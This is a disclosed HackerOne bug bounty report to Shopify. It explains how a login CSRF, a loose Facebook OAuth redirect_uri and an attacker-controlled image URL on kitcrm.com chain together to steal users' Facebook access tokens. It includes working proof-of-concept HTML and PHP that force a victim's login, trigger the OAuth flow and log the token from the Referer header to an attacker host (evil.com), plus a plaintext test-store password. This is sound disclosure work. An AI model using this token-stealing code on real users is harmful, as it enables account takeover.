{"id":211477,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTE0Nzc=","url":"https://hackerone.com/reports/211477","title":"Stealing users' facebook access tokens - kitcrm.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-03-08T00:06:17.999Z","submitted_at":"2017-03-08T00:06:17.999Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"zombiehelp54","url":"/zombiehelp54","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-03-15T21:45:59.073Z","bug_reporter_agreed_on_going_public_at":"2017-03-15T21:45:59.016Z","team_member_agreed_on_going_public_at":"2017-03-14T21:04:13.504Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nI have found a number of minor security vulnerabilities with no impact that when chained together will lead to an attacker being able to steal the current user's facebook access token provided for kitcrm.com\n\n**Description:**\n- In kitcrm.com, users register with their shopify account and the products in their store appear in **Priority Products** section.\n- When a user tries to edit a priority product, the submitted request will contain the product image url as a POST parameter.\n- Users can set their product image to anything, for example `http://evil.com/` will be accepted and added as the product image.\n- Now each time the user visits `https://www.kitcrm.com/seller/onboarding/1`, the page will request `http://evil.com/` as an image.\n- In `https://[shop].myshopify.com` there is no validation for the authenticity token, so there is a CSRF at the login endpoint (which has no impact at all)\n- Users of `kitcrm.com` are authenticated automatically by visiting the endpoint `https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com` which redirects to `https://zh5409.myshopify.com/admin/oauth/authorize?client_id=1333a1b83ccdf7a7.....` then they are redirected back to `kitcrm.com` and logged in.\n- Current `redirect_uri` configuration for Kitcrm facebook oauth application allows redirection to `https://www.kitcrm.com/\u003cANYTHING\u003e`\n\nChaining all of what I mentioned above together, here is how an attacker will be able to steal users' facebook access tokens: \n\n- An attacker registers a shopify store and then uses it to register a `kitcrm.com` account.\n- After that he modifies his priority product image url to `https://evil.com/log_token.php`\n- Then he tricks the victim into visiting a specially crafted HTML page that will:\n   - CSRF login the victim into the attacker's store\n   - CSRF login the victim into `kitcrm.com` \n   - Redirect the victim to `https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621\u0026redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1\u0026response_type....` which will redirect him back to `https://www.kitcrm.com/seller/onboarding/1?code=[fb_token]`\n- After the victim is redirected from facebook to kitcrm.com, a request will be sent to `https://evil.com/log_token.php` with the user's CSRF token in the referrer header.\n- Now the attacker can store the token at his server and use it to access the user's facebook account.\n\n**Proof of concept:**\nI have created a live proof of concept that does all of that and stores the access token at `tokens.log` file. \nIt can be found here: https://alazzazpp.com/shopify/steal.html (Please note that you should allow your browser to access `https://alazzazpp.com` with https since it doesn't have a valid SSL certificate.) \nAlso, here is a PoC video:\n{F167006}\n\n**PoC Code:**\n\u003e Steal.html\n\n```html\n\u003cscript\u003e\nwindow.onload = function () { \n  window.setTimeout(function() {\n              document.getElementById(\"token\").innerHTML = \"\u003ciframe src='https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com'\u003e\u003c/iframe\u003e\";   \n          }, 5000);\n          window.setTimeout(function() {\n               window.open('https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621\u0026redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1\u0026response_type=code\u0026scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages');\n          }, 10000);\nfinished = 0;\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\nif (this.readyState == 4 \u0026\u0026 this.status == 200 \u0026\u0026 this.responseText.length \u003e 0) {\n     document.getElementById(\"token\").innerHTML = \"\u003cb\u003eYour access token is: \u003cbr\u003e\u003c/b\u003e\" +this.responseText;\n     alert(this.responseText);\n     finished = 1;\n   }\n };\nfunction fetchToken(){ \n xhttp.open(\"GET\", \"tokens.log?\"+Math.random(), true);\n xhttp.send();\n if (finished == 1){\n   clearInterval(interval);\n }\n}\nvar interval = setInterval(function(){ fetchToken() } , 10000);\n}\n\u003c/script\u003e\n\u003ch4\u003eIf no window was opened click \u003ca href=\"https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621\u0026redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1\u0026response_type=code\u0026scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages\" target=\"_blank\"\u003ehere\u003c/a\u003e: \n\n\u003cdiv id=\"token\"\u003e\u003ch3\u003eYour access token should appear soon.....\u003c/h3\u003e\u003c/div\u003e\n\u003ciframe src='data:text/html,\u003cform action=\"https://zh5409.myshopify.com/admin/auth/login\" method=\"post\"\u003e\n\u003cinput name=\"utf8\" value=\"\"\u003e\u003cinput name=\"redirect\"\u003e\u003cinput name=\"highlight=\u003e\u003cinput name=\"subdomain\" value=zh5409\u003e\u003cinput name=\"login\" value=███\u003e\u003cinput name=\"password\" value=P@ss123lol\u003e\u003cinput name=\"[remember]\" value=1\u003e\n\u003c/form\u003e\u003cscript\u003edocument.forms[0].submit()\u003c/script\u003e'\u003e\u003c/iframe\u003e\n\u003cdiv id=\"csrf_login\"\u003e\u003c/div\u003e\n```\n\n\u003e log_token.php\n\n```php\n\u003c?php\nheader(\"Access-Control-Allow-Origin: *\");\n$referrer = $_SERVER['HTTP_REFERER'];\n$token = substr($referrer, strpos($referrer, \"=\") + 1);    \n$fp = fopen('tokens.log', 'w');\nfwrite($fp, $token.\"\\n\");\nfclose($fp);\n?\u003e\n```\n\n**Recommended fix:**\nMitigation of this vulnerability is pretty simple, just set your facebook oauth application `redirect_uri` to the exact callback endpoint and remove the domain from the white list.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003cbr\u003e\nI have found a number of minor security vulnerabilities with no impact that when chained together will lead to an attacker being able to steal the current user\u0026#39;s facebook access token provided for kitcrm.com\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eIn kitcrm.com, users register with their shopify account and the products in their store appear in \u003cstrong\u003ePriority Products\u003c/strong\u003e section.\u003c/li\u003e\n\u003cli\u003eWhen a user tries to edit a priority product, the submitted request will contain the product image url as a POST parameter.\u003c/li\u003e\n\u003cli\u003eUsers can set their product image to anything, for example \u003ccode\u003ehttp://evil.com/\u003c/code\u003e will be accepted and added as the product image.\u003c/li\u003e\n\u003cli\u003eNow each time the user visits \u003ccode\u003ehttps://www.kitcrm.com/seller/onboarding/1\u003c/code\u003e, the page will request \u003ccode\u003ehttp://evil.com/\u003c/code\u003e as an image.\u003c/li\u003e\n\u003cli\u003eIn \u003ccode\u003ehttps://[shop].myshopify.com\u003c/code\u003e there is no validation for the authenticity token, so there is a CSRF at the login endpoint (which has no impact at all)\u003c/li\u003e\n\u003cli\u003eUsers of \u003ccode\u003ekitcrm.com\u003c/code\u003e are authenticated automatically by visiting the endpoint \u003ccode\u003ehttps://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com\u003c/code\u003e which redirects to \u003ccode\u003ehttps://zh5409.myshopify.com/admin/oauth/authorize?client_id=1333a1b83ccdf7a7.....\u003c/code\u003e then they are redirected back to \u003ccode\u003ekitcrm.com\u003c/code\u003e and logged in.\u003c/li\u003e\n\u003cli\u003eCurrent \u003ccode\u003eredirect_uri\u003c/code\u003e configuration for Kitcrm facebook oauth application allows redirection to \u003ccode\u003ehttps://www.kitcrm.com/\u0026lt;ANYTHING\u0026gt;\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eChaining all of what I mentioned above together, here is how an attacker will be able to steal users\u0026#39; facebook access tokens: \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eAn attacker registers a shopify store and then uses it to register a \u003ccode\u003ekitcrm.com\u003c/code\u003e account.\u003c/li\u003e\n\u003cli\u003eAfter that he modifies his priority product image url to \u003ccode\u003ehttps://evil.com/log_token.php\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eThen he tricks the victim into visiting a specially crafted HTML page that will:\n\n\u003cul\u003e\n\u003cli\u003eCSRF login the victim into the attacker\u0026#39;s store\u003c/li\u003e\n\u003cli\u003eCSRF login the victim into \u003ccode\u003ekitcrm.com\u003c/code\u003e \u003c/li\u003e\n\u003cli\u003eRedirect the victim to \u003ccode\u003ehttps://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621\u0026amp;redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1\u0026amp;response_type....\u003c/code\u003e which will redirect him back to \u003ccode\u003ehttps://www.kitcrm.com/seller/onboarding/1?code=[fb_token]\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eAfter the victim is redirected from facebook to kitcrm.com, a request will be sent to \u003ccode\u003ehttps://evil.com/log_token.php\u003c/code\u003e with the user\u0026#39;s CSRF token in the referrer header.\u003c/li\u003e\n\u003cli\u003eNow the attacker can store the token at his server and use it to access the user\u0026#39;s facebook account.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003cstrong\u003eProof of concept:\u003c/strong\u003e\u003cbr\u003e\nI have created a live proof of concept that does all of that and stores the access token at \u003ccode\u003etokens.log\u003c/code\u003e file. \u003cbr\u003e\nIt can be found here: \u003ca title=\"https://alazzazpp.com/shopify/steal.html\" href=\"/redirect?url=https%3A%2F%2Falazzazpp.com%2Fshopify%2Fsteal.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://alazzazpp.com/shopify/steal.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (Please note that you should allow your browser to access \u003ccode\u003ehttps://alazzazpp.com\u003c/code\u003e with https since it doesn\u0026#39;t have a valid SSL certificate.) \u003cbr\u003e\nAlso, here is a PoC video:\u003cbr\u003e\n{F167006}\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePoC Code:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eSteal.html\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \n  \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetTimeout\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n              \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etoken\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003einnerHTML\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;iframe src=\u0026#39;https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com\u0026#39;\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e   \n          \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"mi\"\u003e5000\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n          \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetTimeout\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n               \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehttps://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621\u0026amp;redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1\u0026amp;response_type=code\u0026amp;scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n          \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"mi\"\u003e10000\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003efinished\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003exhttp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nx\"\u003exhttp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonreadystatechange\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereadyState\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estatus\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e200\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponseText\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n     \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etoken\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003einnerHTML\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;b\u0026gt;Your access token is: \u0026lt;br\u0026gt;\u0026lt;/b\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponseText\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n     \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponseText\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n     \u003cspan class=\"nx\"\u003efinished\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n   \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003efetchToken\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e \n \u003cspan class=\"nx\"\u003exhttp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eGET\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etokens.log?\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nb\"\u003eMath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erandom\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n \u003cspan class=\"nx\"\u003exhttp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efinished\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n   \u003cspan class=\"nx\"\u003eclearInterval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einterval\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003einterval\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003esetInterval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e \u003cspan class=\"nx\"\u003efetchToken\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e10000\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;h4\u0026gt;\u003c/span\u003eIf no window was opened click \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621\u0026amp;redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1\u0026amp;response_type=code\u0026amp;scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etarget=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;_blank\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003ehere\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e: \n\n\u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;token\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;h3\u0026gt;\u003c/span\u003eYour access token should appear soon.....\u003cspan class=\"nt\"\u003e\u0026lt;/h3\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;iframe\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;data:text/html,\u0026lt;form action=\u0026quot;https://zh5409.myshopify.com/admin/auth/login\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt;\n\u0026lt;input name=\u0026quot;utf8\u0026quot; value=\u0026quot;\u0026quot;\u0026gt;\u0026lt;input name=\u0026quot;redirect\u0026quot;\u0026gt;\u0026lt;input name=\u0026quot;highlight=\u0026gt;\u0026lt;input name=\u0026quot;subdomain\u0026quot; value=zh5409\u0026gt;\u0026lt;input name=\u0026quot;login\u0026quot; value=███\u0026gt;\u0026lt;input name=\u0026quot;password\u0026quot; value=P@ss123lol\u0026gt;\u0026lt;input name=\u0026quot;[remember]\u0026quot; value=1\u0026gt;\n\u0026lt;/form\u0026gt;\u0026lt;script\u0026gt;document.forms[0].submit()\u0026lt;/script\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;csrf_login\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp\u003elog_token.php\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Access-Control-Allow-Origin: *\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$referrer\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;HTTP_REFERER\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$token\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003esubstr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$referrer\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nb\"\u003estrpos\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$referrer\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;=\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e    \n\u003cspan class=\"nv\"\u003e$fp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003efopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;tokens.log\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;w\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003efwrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$fp\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$token\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003efclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$fp\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eRecommended fix:\u003c/strong\u003e\u003cbr\u003e\nMitigation of this vulnerability is pretty simple, just set your facebook oauth application \u003ccode\u003eredirect_uri\u003c/code\u003e to the exact callback endpoint and remove the domain from the white list.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":24,"voters":["delimitry","kapytein","bogdantcaciuc","supernatural","muhammad_uwais","mpz","eveeez","xhzeem","kiraak-boy","fawazxq","and 14 